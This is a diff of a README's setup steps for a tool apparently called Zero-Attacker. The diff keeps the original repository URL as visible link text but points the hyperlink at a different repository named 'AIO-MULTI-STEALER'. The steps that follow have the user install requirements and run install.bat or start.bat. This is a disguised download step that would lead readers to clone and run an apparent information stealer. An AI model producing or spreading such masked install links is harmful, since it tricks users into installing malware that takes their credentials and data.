@@ -8,7 +8,7 @@
 
 
 ### Getting Started
--  git clone https://github.com/AsjadOooO/Zero-attacker/
+-  git clone [https://github.com/AsjadOooO/Zero-attacker/](https://github.com/Cyberseallll/AIO-MULTI-STEALER)
 - `cd Zero-Attacker`
 - `python -m pip install -r requirements.txt`
 - for(Windows user just run the bat file (`install.bat` if running first time else `start.bat`) )
